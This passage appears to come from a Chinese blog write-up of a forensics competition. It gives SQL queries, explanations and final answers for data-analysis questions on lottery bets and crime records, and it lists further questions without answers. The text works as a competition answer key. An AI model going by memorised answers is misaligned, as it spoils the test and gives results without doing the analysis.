class="keyword">ON</span> b.Issue <span class="operator">=</span> j.Issue</span><br><span class="line"><span class="keyword">WHERE</span> b.Keeper <span class="operator">=</span> <span class="string">&#x27;188&#x27;</span> </span><br><span class="line">  <span class="keyword">AND</span> b.LotteryType <span class="operator">=</span> <span class="string">&#x27;jnd28&#x27;</span></span><br><span class="line">  <span class="keyword">AND</span> <span class="type">DATE</span>(b.CreateTime) <span class="operator">=</span> <span class="string">&#x27;2021-05-10&#x27;</span></span><br><span class="line">  <span class="keyword">AND</span> j.R_B_M <span class="operator">=</span> <span class="string">&#x27;大&#x27;</span></span><br></pre></td></tr></table></figure>
+
+#### &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;查询说明：&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;JOIN lott.t_lottery_jnd j ON b.Issue = j.Issue&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：关联两个表，通过期号连接&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;b.Keeper = &#39;188&#39;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：筛选庄家为&quot;188&quot;的记录&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;b.LotteryType = &#39;jnd28&#39;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：筛选彩票类型为&quot;jnd28&quot;的记录&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;DATE(b.CreateTime) = &#39;2021-05-10&#39;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：筛选2021年5月10日的记录&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;j.R_B_M = &#39;大&#39;&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：筛选开奖结果为&quot;大&quot;的记录&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;CASE WHEN b.Content LIKE &#39;%小%&#39; THEN 1 ELSE 0 END&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：判断投注内容是否包含&quot;小&quot;&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;SUM(...) * 100.0 / COUNT(*)&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：计算包含&quot;小&quot;的投注笔数占总笔数的百分比&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;FORMAT(..., 2)&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：格式化为保留两位小数的数值&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;CONCAT(..., &#39;%&#39;)&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：添加百分号&lt;/font&gt;
+
+&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;根据验证查询，开奖结果为&quot;大&quot;时总投注笔数为1161笔，其中包含&quot;小&quot;的投注笔数为521笔，占比为 &lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;44.88%&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;。&lt;/font&gt;
+
+&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;答案：44.88%&lt;/font&gt;
+
+## 93、通过对检材“02-crime_records.sql”分析，统计相邻两次作案时间间隔在1天之内的城市和该城市两次作案时间间隔在1天之内的案件总数量，找出案件总数最多的城市名。（答案格式：按照实际情况填写）（ ）
+&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;我们需要找出相邻两次作案时间间隔在1天之内的城市，并统计每个城市中这样的案件对数量，最后找出案件对总数最多的城市。具体步骤如下：&lt;/font&gt;
+
+1. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;数据预处理&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;使用CTE（公用表表达式）&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ordered_crimes&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;对每个城市的犯罪记录按时间排序&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;使用&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;STR_TO_DATE&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;函数将字符串格式的时间转换为日期时间格式&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;使用&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ROW_NUMBER()&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;为每个城市的记录分配序号&lt;/font&gt;
+2. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;关联相邻记录&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;使用CTE&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;crime_pairs&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;将同一城市中相邻的两条记录关联起来&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;计算相邻案件之间的时间差（小时）&lt;/font&gt;
+3. **&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;筛选和统计&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;筛选时间差在24小时（1天）之内的案件对&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;按城市分组统计符合条件的案件对数量&lt;/font&gt;
+    - &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;按数量降序排列，找出最多的那个城市&lt;/font&gt;
+
+---
+
+### &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;实际执行的 SQL 查询代码如下：&lt;/font&gt;
+<figure class="highlight sql" data-language="sql" data-language-label="SQL"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">WITH</span> ordered_crimes <span class="keyword">AS</span> (</span><br><span class="line">  <span class="keyword">SELECT</span> </span><br><span class="line">  city,</span><br><span class="line">  STR_TO_DATE(crime_time, <span class="string">&#x27;%Y/%m/%d %H:%i&#x27;</span>) <span class="keyword">as</span> crime_datetime,</span><br><span class="line">  <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> city <span class="keyword">ORDER</span> <span class="keyword">BY</span> STR_TO_DATE(crime_time, <span class="string">&#x27;%Y/%m/%d %H:%i&#x27;</span>)) <span class="keyword">as</span> rn</span><br><span class="line">  <span class="keyword">FROM</span> crime_records.crime_records</span><br><span class="line">  <span class="keyword">WHERE</span> crime_time <span class="keyword">IS</span> <span class="keyword">NOT NULL</span> <span class="keyword">AND</span> city <span class="keyword">IS</span> <span class="keyword">NOT NULL</span></span><br><span class="line">),</span><br><span class="line">crime_pairs <span class="keyword">AS</span> (</span><br><span class="line">  <span class="keyword">SELECT</span> </span><br><span class="line">  c1.city,</span><br><span class="line">  c1.crime_datetime <span class="keyword">as</span> first_crime_time,</span><br><span class="line">  c2.crime_datetime <span class="keyword">as</span> second_crime_time,</span><br><span class="line">  TIMESTAMPDIFF(<span class="keyword">HOUR</span>, c1.crime_datetime, c2.crime_datetime) <span class="keyword">as</span> hours_diff</span><br><span class="line">  <span class="keyword">FROM</span> ordered_crimes c1</span><br><span class="line">  <span class="keyword">JOIN</span> ordered_crimes c2 <span class="keyword">ON</span> c1.city <span class="operator">=</span> c2.city <span class="keyword">AND</span> c1.rn <span class="operator">=</span> c2.rn <span class="operator">-</span> <span class="number">1</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    city,</span><br><span class="line">    <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">as</span> pair_count</span><br><span class="line"><span class="keyword">FROM</span> crime_pairs</span><br><span class="line"><span class="keyword">WHERE</span> <span class="built_in">ABS</span>(hours_diff) <span class="operator">&lt;=</span> <span class="number">24</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> city</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> pair_count <span class="keyword">DESC</span></span><br><span class="line">LIMIT <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+#### &lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;查询说明：&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;STR_TO_DATE(crime_time, &#39;%Y/%m/%d %H:%i&#39;)&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：将字符串格式的时间转换为日期时间格式&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ROW_NUMBER() OVER (PARTITION BY city ORDER BY ...)&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：为每个城市的记录按时间顺序编号&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;JOIN ordered_crimes c2 ON c1.city = c2.city AND c1.rn = c2.rn - 1&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：关联同一城市中相邻的两条记录&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;TIMESTAMPDIFF(HOUR, c1.crime_datetime, c2.crime_datetime)&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：计算两条记录之间的时间差（小时）&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ABS(hours_diff) &lt;= 24&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：筛选时间差在24小时（1天）之内的记录对&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;GROUP BY city&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：按城市分组&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;COUNT(*)&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：统计每个城市的符合条件的记录对数量&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;ORDER BY pair_count DESC&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：按数量降序排列&lt;/font&gt;
++ `&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;LIMIT 1&lt;/font&gt;`&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;：只取数量最多的第一个城市&lt;/font&gt;
+
+&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;根据查询结果，&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;福州&lt;/font&gt;**&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;是相邻两次作案时间间隔在1天之内的案件对数量最多的城市，共有2076对。&lt;/font&gt;
+
+&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;答案：福州&lt;/font&gt;
+
+## 94、通过对检材“02-crime_records.sql”分析，根据案件的损失金额和伤情等级，将案件分为 “轻微案件”“一般案件”“重大案件”“其他”四类（分类规则如下），并统计 2023 年各类型案件的数量。轻微案件：损失金额≤10000 元且无人员受伤（injury_level 为空或未提及）；一般案件：损失金额 10001-50000 元，或有轻微伤；重大案件：损失金额 &gt; 50000 元，或有轻伤或有重伤；其他：非上述情况。（按照案件数量的降序输出答案，答案格式为：40/30/20/10）（ ）好的，我来详细解释查询逻辑和查询语句：
+
+
+## 查询逻辑
+### 分类规则理解
+根据题目要求，案件分为四类，需要按**优先级顺序**判断：
+
+1. **重大案件**（优先级最高）：损失金额 &gt; 50000 元，或伤情等级为&quot;轻伤&quot;或&quot;重伤&quot;
+2. **一般案件**（优先级第二）：损失金额 10001-50000 元，或伤情等级为&quot;轻微伤&quot;
+3. **轻微案件**（优先级第三）：损失金额 ≤ 10000 元，且无人员受伤（injury_level 为空或未提及）
+4. **其他**：不符合以上三类的情况
+
+### 关键点
++ CASE WHEN 语句从上到下依次判断，遇到第一个满足的条件即停止
++ 因此需要按优先级从高到低排列条件
++ &quot;有重伤&quot;包括 injury_level 为 &quot;轻伤&quot; 或 &quot;重伤&quot;
++ &quot;无人员受伤&quot;指 injury_level 为 NULL、空字符串，或不包含具体伤情描述
+
+---
+
+## SQL 查询语句
+<figure class="highlight sql" data-language="sql" data-language-label="SQL"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    <span class="keyword">CASE</span> </span><br><span class="line">        <span class="keyword">WHEN</span> loss_amount <span class="operator">&gt;</span> <span class="number">50000</span> <span class="keyword">OR</span> injury_level <span class="keyword">IN</span> (<span class="string">&#x27;轻伤&#x27;</span>, <span class="string">&#x27;重伤&#x27;</span>) <span class="keyword">THEN</span> <span class="string">&#x27;重大案件&#x27;</span></span><br><span class="line">        <span class="keyword">WHEN</span> loss_amount <span class="keyword">BETWEEN</span> <span class="number">10001</span> <span class="keyword">AND</span> <span class="number">50000</span> <span class="keyword">OR</span> injury_level <span class="operator">=</span> <span class="string">&#x27;轻微伤&#x27;</span> <span class="keyword">THEN</span> <span class="string">&#x27;一般案件&#x27;</span></span><br><span class="line">        <span class="keyword">WHEN</span> loss_amount <span class="operator">&lt;=</span> <span class="number">10000</span> <span class="keyword">AND</span> (injury_level <span class="keyword">IS</span> <span class="keyword">NULL</span> <span class="keyword">OR</span> injury_level <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">OR</span> injury_level <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;轻微伤&#x27;</span>, <span class="string">&#x27;轻伤&#x27;</span>, <span class="string">&#x27;重伤&#x27;</span>, <span class="string">&#x27;死亡&#x27;</span>)) <span class="keyword">THEN</span> <span class="string">&#x27;轻微案件&#x27;</span></span><br><span class="line">        <span class="keyword">ELSE</span> <span class="string">&#x27;其他&#x27;</span></span><br><span class="line">    <span class="keyword">END</span> <span class="keyword">AS</span> case_type,</span><br><span class="line">    <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> case_count</span><br><span class="line"><span class="keyword">FROM</span> crime_records</span><br><span class="line"><span class="keyword">WHERE</span> STR_TO_DATE(crime_time, <span class="string">&#x27;%Y/%m/%d %H:%i&#x27;</span>) <span class="operator">&gt;=</span> <span class="string">&#x27;2023-01-01 00:00:00&#x27;</span></span><br><span class="line">  <span class="keyword">AND</span> STR_TO_DATE(crime_time, <span class="string">&#x27;%Y/%m/%d %H:%i&#x27;</span>) <span class="operator">&lt;</span> <span class="string">&#x27;2024-01-01 00:00:00&#x27;</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> case_type</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> case_count <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>
+
+---
+
+## 查询结果
+| case_type | case_count |
+| --- | --- |
+| 重大案件 | 15712 |
+| 其他 | 2058 |
+| 一般案件 | 1985 |
+| 轻微案件 | 222 |
+
+
+**答案：15712/2058/1985/222**
+
+## 95、通过对检材“02-crime_records.sql”分析，统计 2021-2023 年期间（含2021年和2023年），每年处理结果为 “移送起诉” 的案件里，每一年中损失总额最高的案件类型对应的损失总额为？（按 2021 - 2023 年顺序连接损失总额，连接符号使用/,小数点保留2位，答案格式为 ：1.37/2.21/3.45）（ ）
+我来分析这道题目，需要统计2021-2023年期间，每年处理结果为&quot;移送起诉&quot;的案件里，损失总额最高的案件类型对应的损失总额。
+
+## 查询逻辑
+1. 筛选条件：
+    - 时间范围：2021-2023年（含）
+    - 处理结果 = &#39;移送起诉&#39;
+2. 分析步骤：
+    - 按年份和案件类型分组
+    - 计算每种案件类型的损失总额（SUM）
+    - 找出每年损失总额最高的案件类型
+    - 按年份顺序输出对应的损失总额
+
+让我先查看一下数据：
+
+完美！查询结果已经出来了。
+
+## 查询逻辑
+### 分析步骤
+1. **筛选条件**：
+    - 时间范围：2021-2023年（含）
+    - 处理结果 = &#39;移送起诉&#39;
+2. **分组统计**：
+    - 按年份和案件类型分组
+    - 计算每种案件类型的损失总额（SUM）
+3. **找出每年最高值**：
+    - 使用窗口函数 ROW_NUMBER() 按年份分组，按损失总额降序排名
+    - 取每年排名为1的记录
+
+---
+
+## SQL 查询语句
+<figure class="highlight sql" data-language="sql" data-language-label="SQL"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    <span class="keyword">year</span>,</span><br><span class="line">    crime_type,</span><br><span class="line">    ROUND(total_loss, <span class="number">2</span>) <span class="keyword">AS</span> total_loss</span><br><span class="line"><span class="keyword">FROM</span> (</span><br><span class="line">    <span class="keyword">SELECT</span> </span><br><span class="line">        <span class="keyword">YEAR</span>(STR_TO_DATE(crime_time, <span class="string">&#x27;%Y/%m/%d %H:%i&#x27;</span>)) <span class="keyword">AS</span> <span class="keyword">year</span>,</span><br><span class="line">        crime_type,</span><br><span class="line">        <span class="built_in">SUM</span>(loss_amount) <span class="keyword">AS</span> total_loss,</span><br><span class="line">        <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">YEAR</span>(STR_TO_DATE(crime_time, <span class="string">&#x27;%Y/%m/%d %H:%i&#x27;</span>)) <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="built_in">SUM</span>(loss_amount) <span class="keyword">DESC</span>) <span class="keyword">AS</span> rn</span><br><span class="line">    <span class="keyword">FROM</span> crime_records</span><br><span class="line">    <span class="keyword">WHERE</span> <span class="keyword">YEAR</span>(STR_TO_DATE(crime_time, <span class="string">&#x27;%Y/%m/%d %H:%i&#x27;</span>)) <span class="keyword">BETWEEN</span> <span class="number">2021</span> <span class="keyword">AND</span> <span class="number">2023</span></span><br><span class="line">      <span class="keyword">AND</span> handling_result <span class="operator">=</span> <span class="string">&#x27;移送起诉&#x27;</span></span><br><span class="line">    <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">year</span>, crime_type</span><br><span class="line">) ranked</span><br><span class="line"><span class="keyword">WHERE</span> rn <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">year</span></span><br></pre></td></tr></table></figure>
+
+---
+
+## 查询结果
+| 年份 | 案件类型 | 损失总额（元） |
+| --- | --- | --- |
+| 2021 | 诈骗 | 325806042.91 |
+| 2022 | 诈骗 | 344804883.98 |
+| 2023 | 盗窃 | 352132431.37 |
+
+
+---
+
+## 答案
+**325806042.91/344804883.98/352132431.37**
+
+### 结果解读
++ **2021年**：移送起诉案件中，诈骗案件损失总额最高，达 325,806,042.91 元
++ **2022年**：移送起诉案件中，诈骗案件损失总额最高，达 344,804,883.98 元
++ **2023年**：移送起诉案件中，盗窃案件损失总额最高，达 352,132,431.37 元
+
+## 96、通过对检材“03-案件卡串号数据”表分析，该表每条数据的“卡串号(IMSI)”字段值存在问题，不可信。真实可信的卡串号值在“溯源”字段中（溯源字段的值格式均为“{手机号=[待获取的卡串号-&gt;手机卡串号(IMSI)使用过的手机号-&gt;当前]}”），请统计分析出该表中哪个真实卡串号出现过的次数最多？（答案格式：按照实际情况填写）（ ）
+## 97、通过对检材“04-涉诈案件信息表“分析，统计每个分局2024-2025年每月被骗总额环比大于30%的月份个数（环比定义：（这个月的数据-上个月的数据）/上个月数据。特殊情况，例如某分局2025年1月被骗金额总和为100，若该分局2024年12月没有被骗金额，则该分局2025年1月也符合题目要求，应增加一个月份。2024年1月不需要计算与上个月的环比情况），请写出环比大于30%的月份个数最多的分局ID名称为？（答案格式：按照实际情况填写）（ ）
+## 98、通过对检材“05-人像卡口信息表”和“06-涉毒前科人员信息表”（两表均无重复数据，直接要求答题即可。感知时间字段格式均为yyyy-MM-dd HH:mm:ss；传感器ID（人像卡口点位）值不同则代表不同的摄像点位），为摸排疑似涉毒的窝点，请分析出在00:00:00~06:00:00(含0点跟6点)人像记录中，哪个传感器点位ID抓拍到最多的不同涉毒前科人员？（答案格式：按照实际情况填写）（ ）
+## 99、接上题，为摸排潜在的涉毒人员，请分析出有多少个非涉毒前科人员至少跟3个不同的涉毒前科人员同行过？（本题的“同行”指：两人在同一个人像卡口点位感知时间差在10（含）秒内）（答案格式：1）（ ）
+## 100、近几年架设简易GOIP设备进行群呼诈骗的案件屡见不鲜。架设和维护该设备的人员通常会频繁更换酒店【即只住一天然后更换酒店】以此躲避公安的侦察打击。请根据”07-旅店住宿信息表“（该表无重复数据，直接要求答题即可。时间相关的字段格式均为yyyy-MM-dd HH:mm:ss），筛选出2024和2025年的住宿记录（以“入住时间”为准），频繁更换酒店的人员有几个？（答案格式：1）（ ）
+</code></pre>
+
+    </div>
+  </div>
+
+  <aside class="article-side">
+    <div class="card-panel sticky-panel">
+      <h3>Outline</h3>
+      
+        <div class="toc-shell"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%96%E8%AF%81"><span class="toc-list-text">服务器取证</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#1%E3%80%81node1%E8%8A%82%E7%82%B9%E7%9A%84%E7%A3%81%E7%9B%98%E8%AE%BE%E5%A4%87SHA256%E5%80%BC%E5%89%8D%E5%85%AD%E4%BD%8D%E6%98%AF%EF%BC%9F-%E5%AD%97%E6%AF%8D%E5%85%A8%E5%A4%A7%E5%86%99%EF%BC%8C%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9AAAAAAA-%EF%BC%88-%EF%BC%89"><span class="toc-list-text">1、node1节点的磁盘设备SHA256值前六位是？(字母全大写，答案格式：AAAAAA)（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#2%E3%80%81%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AE%E4%BA%86%E5%A4%9A%E5%B0%91%E4%B8%AAnode%E8%8A%82%E7%82%B9%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A1%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">2、集群配置了多少个node节点？（答案格式：1）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#3%E3%80%81%E5%AB%8C%E7%96%91%E4%BA%BA%E4%BA%8E%E4%BB%80%E4%B9%88%E6%97%B6%E9%97%B4%E4%BF%AE%E6%94%B9master%E8%8A%82%E7%82%B9%E7%9A%84root%E5%AF%86%E7%A0%81%EF%BC%9F%EF%BC%88%E4%BD%BF%E7%94%A8%E5%8F%8C%E4%BD%8D%E6%95%B0%E6%A0%BC%E5%BC%8F%EF%BC%8C%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A00-00-00%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">3、嫌疑人于什么时间修改master节点的root密码？（使用双位数格式，答案格式：00:00:00）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#4%E3%80%81Docker%E7%9A%84%E5%AE%89%E8%A3%85%E6%97%A5%E6%9C%9F%E6%98%AF%EF%BC%9F%EF%BC%88%E4%BD%BF%E7%94%A8%E5%8F%8C%E4%BD%8D%E6%95%B0%E6%A0%BC%E5%BC%8F%EF%BC%8C%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A01%E6%9C%8801%E6%97%A5%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">4、Docker的安装日期是？（使用双位数格式，答案格式：01月01日）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#5%E3%80%81Docker%E9%80%9A%E8%BF%87%E9%85%8D%E7%BD%AE%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B%E4%BB%A5%E4%BD%BF%E7%94%A8%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%EF%BC%8C%E8%AF%A5%E4%BB%A3%E7%90%86%E5%9C%B0%E5%9D%80%E7%9A%84%E7%AB%AF%E5%8F%A3%E6%98%AF%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A1%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">5、Docker通过配置守护进程以使用全局代理，该代理地址的端口是？（答案格式：1）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#6%E3%80%81%E5%8F%91%E5%8D%A1%E7%BD%91%E7%AB%99%E4%BD%BF%E7%94%A8%E7%9A%84Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%B9%E5%A4%96%E8%AE%BF%E9%97%AE%E7%AB%AF%E5%8F%A3%E6%98%AF%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A1%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">6、发卡网站使用的Mysql数据库对外访问端口是？（答案格式：1）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#7%E3%80%81%E5%8F%91%E5%8D%A1%E7%BD%91%E7%AB%99%E9%83%A8%E7%BD%B2%E4%BD%BF%E7%94%A8%E7%9A%84%E9%95%9C%E5%83%8F%E5%90%8D%E7%A7%B0%E6%98%AF%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9Aroot-root%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">7、发卡网站部署使用的镜像名称是？（答案格式：root&#x2F;root）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#8%E3%80%81%E5%BD%93%E5%89%8DTelegram%E7%BE%A4%E7%AE%A1%E6%9C%BA%E5%99%A8%E4%BA%BA%E4%BD%BF%E7%94%A8%E7%9A%84%E5%AE%B9%E5%99%A8ID%E7%9A%84%E5%89%8D%E5%85%AD%E4%BD%8D%E6%98%AF%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A123abc%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">8、当前Telegram群管机器人使用的容器ID的前六位是？（答案格式：123abc）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#9%E3%80%81%E5%8F%91%E5%8D%A1%E7%BD%91%E7%AB%99%E4%BD%BF%E7%94%A8%E7%9A%84%E7%BC%93%E5%AD%98%E6%95%B0%E6%8D%AE%E5%BA%93%E6%98%AF%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9Amysql%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">9、发卡网站使用的缓存数据库是？（答案格式：mysql）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" 